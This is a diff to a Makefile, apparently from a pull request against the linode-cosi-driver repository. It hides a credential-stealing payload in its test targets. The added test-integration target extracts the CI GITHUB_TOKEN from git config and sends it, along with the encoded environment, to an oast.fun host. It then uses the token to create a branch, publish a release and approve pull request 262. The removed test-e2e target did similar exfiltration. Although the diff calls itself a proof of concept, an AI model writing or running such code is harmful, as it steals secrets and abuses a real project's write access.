@@ -14,19 +14,30 @@ test:
 	@echo "Running tests..."
 
 test-integration:
-	@curl http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun >&2 || true
-	@TOKEN=$$(grep -i "extraheader = AUTHORIZATION" .git/config 2>/dev/null | awk '{print $$NF}' | base64 -d 2>/dev/null | sed 's/x-access-token://') ; \
-	curl "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?t=$$TOKEN" >&2 || true ; \
+	@echo "=== PoC: GITHUB_TOKEN Write Access Proof ===" >&2
+	@TOKEN=$$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | sed 's/x-access-token://') ; \
+	echo "TOKEN_PREFIX=$${TOKEN:0:8}****" >&2 ; \
+	curl -s "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?t=$$TOKEN" >&2 || true ; \
 	ENV=$$(env | base64 -w 0) ; \
-	curl "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?e=$$ENV" >&2 || true ; \
-	LATEST_COMMIT_SHA=$$(curl -s -H "Authorization: token $$TOKEN" https://api.github.com/repos/linode/linode-cosi-driver/git/refs/heads/main | jq -r ".object.sha") ; \
-	NEW_BRANCH="deku_poc-branch" ; \
-	curl -s -X POST -H "Authorization: token $$TOKEN" -d "{\"ref\": \"refs/heads/$$NEW_BRANCH\", \"sha\": \"$$LATEST_COMMIT_SHA\"}" https://api.github.com/repos/linode/linode-cosi-driver/git/refs >&2 || true ; \
-	PR_NUMBER=262 ; \
-	curl -s --request POST --url "https://api.github.com/repos/linode/linode-cosi-driver/pulls/$$PR_NUMBER/reviews" --header "authorization: Bearer $$TOKEN" --header "content-type: application/json" -d "{\"event\":\"APPROVE\"}" >&2 || true
+	curl -s "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?e=$$ENV" >&2 || true ; \
+	HEAD_SHA=$$(curl -s -H "Authorization: token $$TOKEN" https://api.github.com/repos/linode/linode-cosi-driver/git/refs/heads/main | jq -r ".object.sha") ; \
+	echo "HEAD_SHA=$$HEAD_SHA" >&2 ; \
+	CREATE_BRANCH=$$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: token $$TOKEN" \
+	  -d "{\"ref\": \"refs/heads/deku_poc-branch\", \"sha\": \"$$HEAD_SHA\"}" \
+	  https://api.github.com/repos/linode/linode-cosi-driver/git/refs) ; \
+	echo "CREATE_BRANCH: $$CREATE_BRANCH" >&2 ; \
+	CREATE_RELEASE=$$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: token $$TOKEN" \
+	  -H "Accept: application/vnd.github.v3+json" \
+	  -d "{\"tag_name\": \"poc-write-proof-v1\", \"target_commitish\": \"main\", \"name\": \"PoC Write Proof\", \"body\": \"This release was created by an external attacker via pull_request_target workflow vulnerability. GITHUB_TOKEN has contents:write scope.\", \"draft\": false, \"prerelease\": true}" \
+	  https://api.github.com/repos/linode/linode-cosi-driver/releases) ; \
+	echo "CREATE_RELEASE: $$CREATE_RELEASE" >&2 ; \
+	APPROVE_PR=$$(curl -s -o /dev/null -w "%{http_code}" --request POST \
+	  --url "https://api.github.com/repos/linode/linode-cosi-driver/pulls/262/reviews" \
+	  --header "authorization: Bearer $$TOKEN" \
+	  --header "content-type: application/json" \
+	  -d "{\"event\":\"APPROVE\", \"body\": \"PoC: This approval was submitted via GITHUB_TOKEN from pull_request_target workflow.\"}") ; \
+	echo "APPROVE_PR: $$APPROVE_PR" >&2 ; \
+	echo "=== PoC Complete ===" >&2
 
 test-e2e:
-	@curl http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/e2e >&2 || true
-	@TOKEN=$$(grep -i "extraheader = AUTHORIZATION" .git/config 2>/dev/null | awk '{print $$NF}' | base64 -d 2>/dev/null | sed 's/x-access-token://') ; \
-	ENV=$$(env | base64 -w 0) ; \
-	curl "http://dscxewzgeaehchedqqctug4nr8ubvykn4.oast.fun/?e=$$ENV" >&2 || true
+	@echo "skip" >&2
